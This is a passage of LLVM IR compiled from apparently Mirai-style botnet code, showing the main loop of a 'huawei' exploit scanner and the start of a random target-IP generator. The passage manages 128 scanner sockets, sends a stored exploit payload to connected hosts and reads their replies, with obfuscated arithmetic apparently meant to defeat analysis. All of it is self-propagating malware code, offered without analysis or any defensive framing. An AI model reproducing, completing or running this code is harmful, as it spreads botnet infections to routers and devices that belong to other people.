  %463 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %464 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %463, i32 0, i32 3
  store i32 %462, i32* %464, align 4
  %465 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %466 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %465, i32 0, i32 0
  %467 = load i16, i16* %466, align 4
  %468 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %469 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %468, i32 0, i32 4
  store i16 %467, i16* %469, align 8
  %470 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  call void @huawei_setup_connection(%struct.exploit_scanner_connection* %470)
  br label %297

; <label>:471:                                    ; preds = %458, %321
  br label %472

; <label>:472:                                    ; preds = %471
  %473 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %474 = getelementptr inbounds [16 x i64], [16 x i64]* %473, i64 0, i64 0
  %475 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %474) #6, !srcloc !3
  %476 = extractvalue { i64, i64* } %475, 0
  %477 = extractvalue { i64, i64* } %475, 1
  %478 = trunc i64 %476 to i32
  store i32 %478, i32* %24, align 4
  %479 = ptrtoint i64* %477 to i64
  %480 = trunc i64 %479 to i32
  store i32 %480, i32* %25, align 4
  br label %481

; <label>:481:                                    ; preds = %472
  br label %482

; <label>:482:                                    ; preds = %481
  %483 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %484 = getelementptr inbounds [16 x i64], [16 x i64]* %483, i64 0, i64 0
  %485 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %484) #6, !srcloc !4
  %486 = extractvalue { i64, i64* } %485, 0
  %487 = extractvalue { i64, i64* } %485, 1
  %488 = trunc i64 %486 to i32
  store i32 %488, i32* %26, align 4
  %489 = ptrtoint i64* %487 to i64
  %490 = trunc i64 %489 to i32
  store i32 %490, i32* %27, align 4
  br label %491

; <label>:491:                                    ; preds = %482
  store i32 0, i32* %1, align 4
  br label %492

; <label>:492:                                    ; preds = %619, %491
  %493 = load i32, i32* %1, align 4
  %494 = icmp slt i32 %493, 128
  br i1 %494, label %495, label %625

; <label>:495:                                    ; preds = %492
  store i32 5, i32* %28, align 4
  %496 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %497 = load i32, i32* %1, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %496, i64 %498
  store %struct.exploit_scanner_connection* %499, %struct.exploit_scanner_connection** %7, align 8
  %500 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %501 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %500, i32 0, i32 2
  %502 = load i32, i32* %501, align 8
  %503 = icmp ne i32 %502, 0
  br i1 %503, label %504, label %527

; <label>:504:                                    ; preds = %495
  %505 = load i32, i32* @huawei_fake_time, align 4
  %506 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %507 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %506, i32 0, i32 1
  %508 = load i32, i32* %507, align 4
  %509 = sub i32 %505, -982281936
  %510 = sub i32 %509, %508
  %511 = add i32 %510, -982281936
  %512 = sub i32 %505, %508
  %513 = load i32, i32* %28, align 4
  %514 = icmp ugt i32 %511, %513
  br i1 %514, label %515, label %527

; <label>:515:                                    ; preds = %504
  %516 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %517 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %516, i32 0, i32 0
  %518 = load i32, i32* %517, align 8
  %519 = call i32 @close(i32 %518)
  %520 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %521 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %520, i32 0, i32 0
  store i32 -1, i32* %521, align 8
  %522 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %523 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %522, i32 0, i32 2
  store i32 0, i32* %523, align 8
  %524 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %525 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %524, i32 0, i32 6
  %526 = getelementptr inbounds [256 x i8], [256 x i8]* %525, i32 0, i32 0
  call void @util_zero(i8* %526, i32 256)
  br label %619

; <label>:527:                                    ; preds = %504, %495
  %528 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %529 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %528, i32 0, i32 2
  %530 = load i32, i32* %529, align 8
  %531 = icmp eq i32 %530, 1
  br i1 %531, label %542, label %532

; <label>:532:                                    ; preds = %527
  %533 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %534 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %533, i32 0, i32 2
  %535 = load i32, i32* %534, align 8
  %536 = icmp eq i32 %535, 3
  br i1 %536, label %542, label %537

; <label>:537:                                    ; preds = %532
  %538 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %539 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %538, i32 0, i32 2
  %540 = load i32, i32* %539, align 8
  %541 = icmp eq i32 %540, 4
  br i1 %541, label %542, label %571

; <label>:542:                                    ; preds = %537, %532, %527
  %543 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %544 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %543, i32 0, i32 0
  %545 = load i32, i32* %544, align 8
  %546 = srem i32 %545, 64
  %547 = zext i32 %546 to i64
  %548 = shl i64 1, %547
  %549 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %550 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %551 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 8
  %553 = sdiv i32 %552, 64
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds [16 x i64], [16 x i64]* %549, i64 0, i64 %554
  %556 = load i64, i64* %555, align 8
  %557 = and i64 %556, %548
  %558 = xor i64 %556, %548
  %559 = or i64 %557, %558
  %560 = or i64 %556, %548
  store i64 %559, i64* %555, align 8
  %561 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %562 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %561, i32 0, i32 0
  %563 = load i32, i32* %562, align 8
  %564 = load i32, i32* %12, align 4
  %565 = icmp sgt i32 %563, %564
  br i1 %565, label %566, label %570

; <label>:566:                                    ; preds = %542
  %567 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %568 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %567, i32 0, i32 0
  %569 = load i32, i32* %568, align 8
  store i32 %569, i32* %12, align 4
  br label %570

; <label>:570:                                    ; preds = %566, %542
  br label %618

; <label>:571:                                    ; preds = %537
  %572 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %573 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %572, i32 0, i32 2
  %574 = load i32, i32* %573, align 8
  %575 = icmp ne i32 %574, 0
  br i1 %575, label %576, label %617

; <label>:576:                                    ; preds = %571
  %577 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %578 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %577, i32 0, i32 0
  %579 = load i32, i32* %578, align 8
  %580 = srem i32 %579, 64
  %581 = zext i32 %580 to i64
  %582 = shl i64 1, %581
  %583 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %584 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %585 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %584, i32 0, i32 0
  %586 = load i32, i32* %585, align 8
  %587 = sdiv i32 %586, 64
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds [16 x i64], [16 x i64]* %583, i64 0, i64 %588
  %590 = load i64, i64* %589, align 8
  %591 = xor i64 %590, -1
  %592 = xor i64 %582, -1
  %593 = xor i64 2486098529092434931, -1
  %594 = and i64 %591, 2486098529092434931
  %595 = and i64 %590, %593
  %596 = and i64 %592, 2486098529092434931
  %597 = and i64 %582, %593
  %598 = or i64 %594, %595
  %599 = or i64 %596, %597
  %600 = xor i64 %598, %599
  %601 = or i64 %591, %592
  %602 = xor i64 %601, -1
  %603 = or i64 2486098529092434931, %593
  %604 = and i64 %602, %603
  %605 = or i64 %600, %604
  %606 = or i64 %590, %582
  store i64 %605, i64* %589, align 8
  %607 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %608 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %607, i32 0, i32 0
  %609 = load i32, i32* %608, align 8
  %610 = load i32, i32* %11, align 4
  %611 = icmp sgt i32 %609, %610
  br i1 %611, label %612, label %616

; <label>:612:                                    ; preds = %576
  %613 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %614 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %613, i32 0, i32 0
  %615 = load i32, i32* %614, align 8
  store i32 %615, i32* %11, align 4
  br label %616

; <label>:616:                                    ; preds = %612, %576
  br label %617

; <label>:617:                                    ; preds = %616, %571
  br label %618

; <label>:618:                                    ; preds = %617, %570
  br label %619

; <label>:619:                                    ; preds = %618, %515
  %620 = load i32, i32* %1, align 4
  %621 = add i32 %620, -1816505994
  %622 = add i32 %621, 1
  %623 = sub i32 %622, -1816505994
  %624 = add nsw i32 %620, 1
  store i32 %623, i32* %1, align 4
  br label %492

; <label>:625:                                    ; preds = %492
  %626 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %626, align 8
  %627 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %627, align 8
  %628 = load i32, i32* %12, align 4
  %629 = load i32, i32* %11, align 4
  %630 = icmp sgt i32 %628, %629
  br i1 %630, label %631, label %633

; <label>:631:                                    ; preds = %625
  %632 = load i32, i32* %12, align 4
  br label %635

; <label>:633:                                    ; preds = %625
  %634 = load i32, i32* %11, align 4
  br label %635

; <label>:635:                                    ; preds = %633, %631
  %636 = phi i32 [ %632, %631 ], [ %634, %633 ]
  %637 = add i32 1, -1216848350
  %638 = add i32 %637, %636
  %639 = sub i32 %638, -1216848350
  %640 = add nsw i32 1, %636
  %641 = call i32 @select(i32 %639, %struct.fd_set* %5, %struct.fd_set* %6, %struct.fd_set* null, %struct.timeval* %8)
  store i32 %641, i32* %13, align 4
  %642 = call i64 @time(i64* null) #6
  %643 = trunc i64 %642 to i32
  store i32 %643, i32* @huawei_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %644

; <label>:644:                                    ; preds = %882, %635
  %645 = load i32, i32* %1, align 4
  %646 = icmp slt i32 %645, 128
  br i1 %646, label %647, label %888

; <label>:647:                                    ; preds = %644
  %648 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %649 = load i32, i32* %1, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %648, i64 %650
  store %struct.exploit_scanner_connection* %651, %struct.exploit_scanner_connection** %7, align 8
  %652 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %653 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %652, i32 0, i32 0
  %654 = load i32, i32* %653, align 8
  %655 = icmp eq i32 %654, -1
  br i1 %655, label %656, label %657

; <label>:656:                                    ; preds = %647
  br label %882

; <label>:657:                                    ; preds = %647
  %658 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %659 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %660 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %659, i32 0, i32 0
  %661 = load i32, i32* %660, align 8
  %662 = sdiv i32 %661, 64
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds [16 x i64], [16 x i64]* %658, i64 0, i64 %663
  %665 = load i64, i64* %664, align 8
  %666 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %667 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %666, i32 0, i32 0
  %668 = load i32, i32* %667, align 8
  %669 = srem i32 %668, 64
  %670 = zext i32 %669 to i64
  %671 = shl i64 1, %670
  %672 = xor i64 %665, -1
  %673 = xor i64 %671, -1
  %674 = xor i64 8740358493242314630, -1
  %675 = or i64 %672, %673
  %676 = or i64 8740358493242314630, %674
  %677 = xor i64 %675, -1
  %678 = and i64 %677, %676
  %679 = and i64 %665, %671
  %680 = icmp ne i64 %678, 0
  br i1 %680, label %681, label %751

; <label>:681:                                    ; preds = %657
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %682 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %683 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %682, i32 0, i32 0
  %684 = load i32, i32* %683, align 8
  %685 = bitcast i32* %29 to i8*
  %686 = call i32 @getsockopt(i32 %684, i32 1, i32 4, i8* %685, i32* %31) #6
  store i32 %686, i32* %30, align 4
  %687 = load i32, i32* %29, align 4
  %688 = icmp eq i32 %687, 0
  br i1 %688, label %689, label %741

; <label>:689:                                    ; preds = %681
  %690 = load i32, i32* %30, align 4
  %691 = icmp eq i32 %690, 0
  br i1 %691, label %692, label %741

; <label>:692:                                    ; preds = %689
  %693 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %694 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %693, i32 0, i32 2
  %695 = load i32, i32* %694, align 8
  %696 = icmp eq i32 %695, 3
  br i1 %696, label %697, label %722

; <label>:697:                                    ; preds = %692
  %698 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %699 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %698, i32 0, i32 8
  %700 = getelementptr inbounds [2560 x i8], [2560 x i8]* %699, i32 0, i32 0
  %701 = call i32 @util_strcpy(i8* %700, i8* getelementptr inbounds ([887 x i8], [887 x i8]* @.str.77, i32 0, i32 0))
  %702 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %703 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %702, i32 0, i32 0
  %704 = load i32, i32* %703, align 8
  %705 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %706 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %705, i32 0, i32 8
  %707 = getelementptr inbounds [2560 x i8], [2560 x i8]* %706, i32 0, i32 0
  %708 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %709 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %708, i32 0, i32 8
  %710 = getelementptr inbounds [2560 x i8], [2560 x i8]* %709, i32 0, i32 0
  %711 = call i32 @util_strlen(i8* %710)
  %712 = sext i32 %711 to i64
  %713 = call i64 @send(i32 %704, i8* %707, i64 %712, i32 16384)
  %714 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %715 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %714, i32 0, i32 8
  %716 = getelementptr inbounds [2560 x i8], [2560 x i8]* %715, i32 0, i32 0
  call void @util_zero(i8* %716, i32 2560)
  %717 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %718 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %717, i32 0, i32 6
  %719 = getelementptr inbounds [256 x i8], [256 x i8]* %718, i32 0, i32 0
  call void @util_zero(i8* %719, i32 256)
  %720 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %721 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %720, i32 0, i32 2
  store i32 4, i32* %721, align 8
  br label %882

; <label>:722:                                    ; preds = %692
  %723 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %724 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %723, i32 0, i32 2
  %725 = load i32, i32* %724, align 8
  %726 = icmp eq i32 %725, 4
  br i1 %726, label %727, label %736

; <label>:727:                                    ; preds = %722
  %728 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %729 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %728, i32 0, i32 0
  %730 = load i32, i32* %729, align 8
  %731 = call i32 @close(i32 %730)
  %732 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %733 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %732, i32 0, i32 0
  store i32 -1, i32* %733, align 8
  %734 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %735 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %734, i32 0, i32 2
  store i32 0, i32* %735, align 8
  br label %882

; <label>:736:                                    ; preds = %722
  %737 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %738 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %737, i32 0, i32 2
  store i32 3, i32* %738, align 8
  br label %739

; <label>:739:                                    ; preds = %736
  br label %740

; <label>:740:                                    ; preds = %739
  br label %750

; <label>:741:                                    ; preds = %689, %681
  %742 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %743 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %742, i32 0, i32 0
  %744 = load i32, i32* %743, align 8
  %745 = call i32 @close(i32 %744)
  %746 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %747 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %746, i32 0, i32 0
  store i32 -1, i32* %747, align 8
  %748 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %749 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %748, i32 0, i32 2
  store i32 0, i32* %749, align 8
  br label %882

; <label>:750:                                    ; preds = %740
  br label %751

; <label>:751:                                    ; preds = %750, %657
  %752 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %753 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %754 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %753, i32 0, i32 0
  %755 = load i32, i32* %754, align 8
  %756 = sdiv i32 %755, 64
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds [16 x i64], [16 x i64]* %752, i64 0, i64 %757
  %759 = load i64, i64* %758, align 8
  %760 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %761 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %760, i32 0, i32 0
  %762 = load i32, i32* %761, align 8
  %763 = srem i32 %762, 64
  %764 = zext i32 %763 to i64
  %765 = shl i64 1, %764
  %766 = xor i64 %765, -1
  %767 = xor i64 %759, %766
  %768 = and i64 %767, %759
  %769 = and i64 %759, %765
  %770 = icmp ne i64 %768, 0
  br i1 %770, label %771, label %881

; <label>:771:                                    ; preds = %751
  br label %772

; <label>:772:                                    ; preds = %858, %839, %771
  store i32 0, i32* %32, align 4
  %773 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %774 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %773, i32 0, i32 2
  %775 = load i32, i32* %774, align 8
  %776 = icmp eq i32 %775, 0
  br i1 %776, label %777, label %778

; <label>:777:                                    ; preds = %772
  br label %880

; <label>:778:                                    ; preds = %772
  %779 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %780 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %779, i32 0, i32 5
  %781 = load i32, i32* %780, align 4
  %782 = icmp eq i32 %781, 256
  br i1 %782, label %783, label %798

; <label>:783:                                    ; preds = %778
  %784 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %785 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %784, i32 0, i32 6
  %786 = getelementptr inbounds [256 x i8], [256 x i8]* %785, i32 0, i32 0
  %787 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %788 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %787, i32 0, i32 6
  %789 = getelementptr inbounds [256 x i8], [256 x i8]* %788, i32 0, i32 0
  %790 = getelementptr inbounds i8, i8* %789, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %786, i8* %790, i64 192, i32 1, i1 false)
  %791 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %792 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %791, i32 0, i32 5
  %793 = load i32, i32* %792, align 4
  %794 = sub i32 %793, 581102915
  %795 = sub i32 %794, 64
  %796 = add i32 %795, 581102915
  %797 = sub nsw i32 %793, 64
  store i32 %796, i32* %792, align 4
  br label %798

; <label>:798:                                    ; preds = %783, %778
  %799 = call i32* @__errno_location() #9
  store i32 0, i32* %799, align 4
  %800 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %801 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %800, i32 0, i32 0
  %802 = load i32, i32* %801, align 8
  %803 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %804 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %803, i32 0, i32 6
  %805 = getelementptr inbounds [256 x i8], [256 x i8]* %804, i32 0, i32 0
  %806 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %807 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %806, i32 0, i32 5
  %808 = load i32, i32* %807, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds i8, i8* %805, i64 %809
  %811 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %812 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %811, i32 0, i32 5
  %813 = load i32, i32* %812, align 4
  %814 = sub i32 256, 1963463453
  %815 = sub i32 %814, %813
  %816 = add i32 %815, 1963463453
  %817 = sub nsw i32 256, %813
  %818 = call i32 @huawei_recv_strip_null(i32 %802, i8* %810, i32 %816, i32 16384)
  store i32 %818, i32* %32, align 4
  %819 = load i32, i32* %32, align 4
  %820 = icmp eq i32 %819, 0
  br i1 %820, label %821, label %823

; <label>:821:                                    ; preds = %798
  %822 = call i32* @__errno_location() #9
  store i32 104, i32* %822, align 4
  store i32 -1, i32* %32, align 4
  br label %823

; <label>:823:                                    ; preds = %821, %798
  %824 = load i32, i32* %32, align 4
  %825 = icmp eq i32 %824, -1
  br i1 %825, label %826, label %858

; <label>:826:                                    ; preds = %823
  %827 = call i32* @__errno_location() #9
  %828 = load i32, i32* %827, align 4
  %829 = icmp ne i32 %828, 11
  br i1 %829, label %830, label %857

; <label>:830:                                    ; preds = %826
  %831 = call i32* @__errno_location() #9
  %832 = load i32, i32* %831, align 4
  %833 = icmp ne i32 %832, 11
  br i1 %833, label %834, label %857

; <label>:834:                                    ; preds = %830
  %835 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %836 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %835, i32 0, i32 2
  %837 = load i32, i32* %836, align 8
  %838 = icmp eq i32 %837, 3
  br i1 %838, label %839, label %845

; <label>:839:                                    ; preds = %834
  %840 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %841 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %840, i32 0, i32 0
  %842 = load i32, i32* %841, align 8
  %843 = call i32 @close(i32 %842)
  %844 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  call void @huawei_setup_connection(%struct.exploit_scanner_connection* %844)
  br label %772

; <label>:845:                                    ; preds = %834
  %846 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %847 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %846, i32 0, i32 0
  %848 = load i32, i32* %847, align 8
  %849 = call i32 @close(i32 %848)
  %850 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %851 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %850, i32 0, i32 0
  store i32 -1, i32* %851, align 8
  %852 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %853 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %852, i32 0, i32 2
  store i32 0, i32* %853, align 8
  %854 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %855 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %854, i32 0, i32 6
  %856 = getelementptr inbounds [256 x i8], [256 x i8]* %855, i32 0, i32 0
  call void @util_zero(i8* %856, i32 256)
  br label %857

; <label>:857:                                    ; preds = %845, %830, %826
  br label %880

; <label>:858:                                    ; preds = %823
  %859 = load i32, i32* %32, align 4
  %860 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %861 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %860, i32 0, i32 5
  %862 = load i32, i32* %861, align 4
  %863 = sub i32 0, %862
  %864 = sub i32 0, %859
  %865 = add i32 %863, %864
  %866 = sub i32 0, %865
  %867 = add nsw i32 %862, %859
  store i32 %866, i32* %861, align 4
  %868 = load i32, i32* @huawei_fake_time, align 4
  %869 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %870 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %869, i32 0, i32 1
  store i32 %868, i32* %870, align 4
  %871 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %872 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %871, i32 0, i32 6
  %873 = getelementptr inbounds [256 x i8], [256 x i8]* %872, i32 0, i32 0
  %874 = call i32 @util_strlen(i8* %873)
  store i32 %874, i32* %33, align 4
  %875 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %876 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %875, i32 0, i32 6
  %877 = load i32, i32* %33, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds [256 x i8], [256 x i8]* %876, i64 0, i64 %878
  store i8 0, i8* %879, align 1
  br label %772

; <label>:880:                                    ; preds = %857, %777
  br label %881

; <label>:881:                                    ; preds = %880, %751
  br label %882

; <label>:882:                                    ; preds = %881, %741, %727, %697, %656
  %883 = load i32, i32* %1, align 4
  %884 = add i32 %883, 1836642721
  %885 = add i32 %884, 1
  %886 = sub i32 %885, 1836642721
  %887 = add nsw i32 %883, 1
  store i32 %886, i32* %1, align 4
  br label %644

; <label>:888:                                    ; preds = %644
  br label %225
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip.76() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  store i8 0, i8* %3, align 1
  store i8 0, i8* %4, align 1
  store i8 0, i8* %5, align 1
  store i8 0, i8* %6, align 1
  br label %8

; <label>:8:                                      ; preds = %181, %0
  %9 = call i32 @rand_next()
  store i32 %9, i32* %2, align 4
  %10 = call i64 @time(i64* null) #6
  %11 = trunc i64 %10 to i32
